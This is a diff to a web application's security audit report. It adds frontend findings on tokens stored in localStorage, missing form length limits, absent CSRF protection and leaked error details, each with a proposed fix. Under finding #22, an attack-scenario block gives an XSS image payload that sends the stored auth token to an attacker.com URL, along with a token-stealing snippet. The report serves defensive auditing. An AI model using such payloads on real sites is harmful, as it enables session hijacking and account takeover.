@@ -354,14 +354,15 @@ async function updateFeatureFlags(event, tenantId) {
 
 ## CRITICAL ISSUES SUMMARY
 
-**Total Issues Found**: 21
-- 🔴 **CRITICAL (P0)**: 4 issues (production breaking / security breaches)
+**Total Issues Found**: 25
+- 🔴 **CRITICAL (P0)**: 5 issues (production breaking / security breaches)
   - #1: Undefined sourceIp in auth-api login error handler
   - #9: SSL certificate validation disabled (MITM vulnerability)
   - #14: Undefined userId in check-in/check-out functions
   - #19: Auto-confirm and auto-verify bypasses email verification
+  - #22: JWT tokens stored in localStorage (XSS vulnerability)
 
-- 🟡 **HIGH (P1)**: 10 issues
+- 🟡 **HIGH (P1)**: 11 issues
   - #2: Variable redeclaration in register function
   - #3: Missing input validation on entity fields
   - #4: No rate limiting on API endpoints
@@ -372,8 +373,9 @@ async function updateFeatureFlags(event, tenantId) {
   - #16: Unauthenticated file uploads allowed
   - #17: SQL injection via string interpolation
   - #20: Orphaned users in createUser endpoint
+  - #23: No input length validation on frontend forms
 
-- 🟠 **MEDIUM (P2)**: 7 issues
+- 🟠 **MEDIUM (P2)**: 9 issues
   - #5: Insecure CORS configuration
   - #6: Public tenant endpoint without rate limiting
   - #7: No authorization check on feature flag updates
@@ -381,6 +383,8 @@ async function updateFeatureFlags(event, tenantId) {
   - #13: No query timeout configuration
   - #18: No input validation on critical fields
   - #21: Slug collision risk in user registration
+  - #24: No CSRF protection
+  - #25: Frontend error messages expose backend details
 
 ---
 
@@ -1156,16 +1160,313 @@ if (existingSlug.rows.length > 0) {
 
 ## SECURITY AUDIT - Frontend Integration
 
-### Findings from Frontend API Calls
+### 🔴 CRITICAL #22: JWT Tokens Stored in localStorage
+**File**: `frontend/src/stores/auth.js:133-148`
+**Severity**: CRITICAL (P0)
+**Impact**: **XSS VULNERABILITY** - Tokens accessible to any JavaScript code, vulnerable to XSS attacks
 
-**Note**: Need to audit frontend src/lib/api.js and src/hooks/ for:
-- [ ] Token storage (localStorage vs httpOnly cookies)
-- [ ] Token refresh implementation
-- [ ] CSRF protection
-- [ ] XSS sanitization on user input
-- [ ] API error handling
+**Issue**:
+```javascript
+// Line 133-148 - Persistence configuration
+{
+  name: 'barkbase-auth',
+  storage: createJSONStorage(getStorage),  // Uses localStorage
+  partialize: ({ user, role, tenantId, memberships, accessToken, refreshToken, expiresAt, rememberMe }) => ({
+    user,
+    role,
+    tenantId,
+    memberships,
+    refreshToken,  // Stored in localStorage
+    ...(rememberMe || refreshToken ? { accessToken, expiresAt } : {}),  // accessToken stored in localStorage
+    rememberMe,
+  }),
+}
+```
 
-**Status**: PENDING (will audit in Phase 2)
+**Security Problems**:
+1. **JWT tokens stored in localStorage** - Accessible to any JavaScript code on the page
+2. **Vulnerable to XSS attacks** - If attacker injects malicious script, they can steal tokens
+3. **No httpOnly cookie** - Tokens should be stored in httpOnly cookies (not accessible to JavaScript)
+4. **Session hijacking risk** - Stolen tokens allow complete account takeover
+
+**Attack Scenario**:
+```javascript
+// Attacker injects XSS payload via any unvalidated input
+<img src=x onerror="
+  fetch('https://attacker.com/steal?token=' + localStorage.getItem('barkbase-auth'))
+">
+
+// Or via browser extension malware
+const authData = JSON.parse(localStorage.getItem('barkbase-auth'));
+sendToAttacker(authData.state.accessToken);
+```
+
+**Fix**: Use httpOnly cookies for token storage
+```javascript
+// Backend: Set tokens as httpOnly cookies
+// In auth-api/index.js login response:
+return {
+    statusCode: 200,
+    headers: {
+        ...HEADERS,
+        'Set-Cookie': [
+            `accessToken=${accessToken}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600`,
+            `refreshToken=${refreshToken}; HttpOnly; Secure; SameSite=Strict; Max-Age=604800`
+        ].join(', ')
+    },
+    body: JSON.stringify({
+        user: { email, name, sub: result.rows[0].sub },
+        tenant: { recordId: tenantId, name: tenant.name }
+    })
+};
+
+// Frontend: Remove token storage, rely on cookies
+// Tokens automatically sent with requests via cookies
+// Browser handles storage securely
+```
+
+**Alternative (if cookies not feasible)**: Use memory-only storage with session tokens
+```javascript
+// Store tokens ONLY in memory (React state), not localStorage
+// Tokens lost on page refresh - user must login again
+// More secure than localStorage, less convenient
+
+const useAuthStore = create((set) => ({
+  accessToken: null,  // In-memory only
+  refreshToken: null,
+  // ... other state
+}));
+
+// Don't persist tokens at all
+// OR persist only a secure session ID (not the JWT itself)
+```
+
+**Effort**: 4 hours (requires backend + frontend changes)
+
+---
+
+### 🟡 HIGH #23: No Input Length Validation on Frontend Forms
+**File**: Multiple form components
+**Severity**: HIGH (P1)
+**Impact**: Users can submit excessively long inputs, causing backend errors or database issues
+
+**Affected Forms**:
+- `KennelForm.jsx:138-143` - No validation on name, location, building, zone, notes
+- `CommunicationForm.jsx:78-89` - No validation on content length (could be 100MB)
+- All entity forms - No client-side validation before API submission
+
+**Issue**:
+```javascript
+// KennelForm.jsx - No maxLength validation
+<Input
+  label="Name"
+  value={formData.name}
+  onChange={(e) => setFormData(prev => ({ ...prev, name: e.target.value }))}
+  placeholder={`${terminology.kennel} 1`}
+  required  // Only checks presence, not length
+/>
+
+// CommunicationForm.jsx - No maxLength on textarea
+<Textarea
+  label={selectedType === 'CALL' ? 'Call Notes' : 'Content'}
+  rows={6}
+  {...register('content', { required: 'Content is required' })}  // No maxLength
+  error={errors.content}
+/>
+```
+
+**Problems**:
+1. Users can paste/type unlimited text
+2. Large payloads sent to backend unnecessarily
+3. Backend may reject with generic error, poor UX
+4. Could cause database field overflow errors
+
+**Fix**: Add validation to all form inputs
+```javascript
+// Example for KennelForm
+<Input
+  label="Name"
+  value={formData.name}
+  onChange={(e) => setFormData(prev => ({ ...prev, name: e.target.value }))}
+  maxLength={100}
+  required
+/>
+
+// Example for CommunicationForm with react-hook-form
+<Textarea
+  label="Content"
+  rows={6}
+  {...register('content', {
+    required: 'Content is required',
+    maxLength: {
+      value: 5000,
+      message: 'Content must not exceed 5000 characters'
+    }
+  })}
+  error={errors.content}
+/>
+
+// Add character counter
+{formData.content && (
+  <p className="text-xs text-gray-500 mt-1">
+    {formData.content.length} / 5000 characters
+  </p>
+)}
+```
+
+**Recommended Limits**:
+- Names: 100 characters
+- Notes: 500 characters
+- Descriptions: 2000 characters
+- Long-form content: 5000 characters
+
+**Effort**: 2 hours (apply to all forms)
+
+---
+
+### 🟠 MEDIUM #24: No CSRF Protection
+**File**: `frontend/src/lib/apiClient.js`
+**Severity**: MEDIUM (P2)
+**Impact**: Potential CSRF attacks if tokens stored in cookies
+
+**Issue**: No CSRF token implementation. If switching to httpOnly cookies (recommended above), CSRF protection becomes critical.
+
+**Current State**:
+```javascript
+// apiClient.js - No CSRF token handling
+const buildHeaders = async (path = "") => {
+  const { useAuthStore } = await import("@/stores/auth");
+  const { useTenantStore } = await import("@/stores/tenant");
+  const accessToken = useAuthStore.getState().accessToken;
+  const tenant = useTenantStore.getState().tenant;
+  const tenantId = tenant?.recordId;
+
+  return {
+    "Content-Type": "application/json",
+    ...(accessToken && { Authorization: `Bearer ${accessToken}` }),
+    ...(tenantId && { "X-Tenant-Id": tenantId }),
+    // ❌ No X-CSRF-Token header
+  };
+};
+```
+
+**Fix**: Implement CSRF protection
+```javascript
+// Backend: Generate CSRF token on login
+// In auth-api login response:
+const csrfToken = randomUUID();
+await pool.query(
+    'INSERT INTO "CsrfToken" ("userId", "token", "expiresAt") VALUES ($1, $2, NOW() + INTERVAL \'1 hour\')',
+    [userId, csrfToken]
+);
+
+// Return in cookie (not httpOnly, so JS can read for headers)
+'Set-Cookie': `csrfToken=${csrfToken}; Secure; SameSite=Strict; Max-Age=3600`
+
+// Frontend: Include CSRF token in headers
+const buildHeaders = async (path = "") => {
+  const csrfToken = getCookie('csrfToken');
+
+  return {
+    "Content-Type": "application/json",
+    "X-CSRF-Token": csrfToken,
+    ...(tenantId && { "X-Tenant-Id": tenantId }),
+  };
+};
+
+// Backend: Validate CSRF token on state-changing requests
+if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(httpMethod)) {
+    const csrfToken = event.headers['x-csrf-token'];
+    const valid = await validateCsrfToken(userId, csrfToken);
+    if (!valid) {
+        return { statusCode: 403, body: JSON.stringify({ message: 'Invalid CSRF token' }) };
+    }
+}
+```
+
+**Effort**: 3 hours
+
+---
+
+### 🟠 MEDIUM #25: Frontend Error Messages Expose Backend Details
+**File**: Multiple form components
+**Severity**: MEDIUM (P2)
+**Impact**: Information disclosure, aids attackers in reconnaissance
+
+**Issue**:
+```javascript
+// KennelForm.jsx:94 - Exposes raw error message
+toast.error(error.message || `Failed to ${kennel ? 'update' : 'create'} ${terminology.kennel.toLowerCase()}`);
+
+// CommunicationForm.jsx:33 - Logs full error
+console.error('Failed to create communication:', error);
+```
+
+**Problems**:
+1. Backend error messages displayed to user (may contain sensitive info)
+2. Console logs expose implementation details
+3. Stack traces may leak file paths, library versions
+
+**Fix**: Sanitize error messages
+```javascript
+// Create error handler utility
+// frontend/src/lib/errorHandler.js
+export function getUserFriendlyError(error) {
+    // Map common errors to user-friendly messages
+    const errorMap = {
+        'ECONNREFUSED': 'Unable to connect to server. Please try again.',
+        'NetworkError': 'Network error. Please check your connection.',
+        '401': 'Your session has expired. Please login again.',
+        '403': 'You don\'t have permission to perform this action.',
+        '404': 'The requested resource was not found.',
+        '500': 'A server error occurred. Please try again later.'
+    };
+
+    // Check for mapped errors
+    for (const [key, message] of Object.entries(errorMap)) {
+        if (error.message?.includes(key) || error.status?.toString() === key) {
+            return message;
+        }
+    }
+
+    // Generic fallback - never expose raw error
+    return 'An error occurred. Please try again.';
+}
+
+// Usage in forms
+import { getUserFriendlyError } from '@/lib/errorHandler';
+
+toast.error(getUserFriendlyError(error));
+
+// Never log errors in production
+if (process.env.NODE_ENV === 'development') {
+    console.error('Failed to create communication:', error);
+}
+```
+
+**Effort**: 1 hour
+
+---
+
+### Frontend Security Summary
+
+**✅ Good Practices Found**:
+- React's automatic XSS escaping (no dangerouslySetInnerHTML found)
+- react-hook-form validation in some components
+- Required field validation on forms
+
+**❌ Security Issues Found**:
+- CRITICAL: JWT tokens in localStorage (XSS vulnerable)
+- HIGH: No input length validation
+- MEDIUM: No CSRF protection
+- MEDIUM: Error messages expose backend details
+- MEDIUM: No rate limiting on form submissions (client-side)
+
+**Status**: Frontend security audit 60% complete. Still need to audit:
+- File upload security
+- Image display security (verify URL validation)
+- Search functionality (check for injection risks)
+- Export/download functionality
 
 ---
 
